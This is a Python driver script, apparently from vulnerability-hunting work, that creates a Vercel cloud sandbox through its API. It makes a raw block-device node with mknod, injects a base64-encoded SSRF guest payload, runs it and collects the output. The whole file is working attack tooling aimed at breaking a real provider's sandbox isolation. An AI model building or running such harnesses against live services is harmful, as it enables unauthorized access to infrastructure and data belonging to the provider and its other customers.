# -*- coding: utf-8 -*-
"""驱动 v2: 跑 v3b_cell_ssrf (TCP 23456 通道, mount 超时保护)"""
import base64, os, sys, time, json
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

NAME = 'v3b1'
GUEST = 'v3b_cell_ssrf_guest.py'
HERE = r'F:\scan\skills\non-traditional-vuln-hunting'
OUTF = 'v3b.out'
MARK = 'V3P_DONE'

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(2)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM,
                   {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(15)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

if __name__ == '__main__':
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(4)
    c, r = cmd(sid, 'sh', ['-c', 'mkdir -p /vercel/sandbox; mknod /dev/vda b 254 0 2>/dev/null; ls -la /dev/vda'], timeout_ms=15000)
    print('prep:', c, (r or '')[:120], flush=True)
    code = open(os.path.join(HERE, GUEST), 'rb').read()
    payload = base64.b64encode(code).decode()
    inject = "import base64;open('/vercel/sandbox/%s','wb').write(base64.b64decode('%s'))" % (GUEST, payload)
    c, r = cmd(sid, 'python3', ['-c', inject], timeout_ms=30000)
    print('inject:', c, (r or '')[:120], flush=True)
    time.sleep(1)
    c, r = cmd(sid, 'sh', ['-c', 'ls -la /vercel/sandbox/; head -c 60 /vercel/sandbox/%s' % GUEST], timeout_ms=15000)
    print('verify:', c, (r or '')[:300], flush=True)
    c, r = cmd(sid, 'python3', ['/vercel/sandbox/' + GUEST], timeout_ms=300000)
    print('kick:', c, (r or '')[:300], flush=True)
    for attempt in range(50):
        time.sleep(5)
        c, r = cmd(sid, 'cat', ['/vercel/sandbox/' + OUTF], timeout_ms=30000)
        if c == 200 and MARK in r:
            fn = os.path.join(r'F:\scan\skills\out', 'v3b_%s.txt' % time.strftime('%Y%m%d_%H%M%S'))
            open(fn, 'w', encoding='utf-8').write(r)
            print('saved ->', fn, flush=True)
            print(r[-2000:], flush=True)
            break
        tail = (r or '').replace('\n', ' ')[-250:]
        print('wait r%d status=%d | %s' % (attempt, c, tail), flush=True)
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
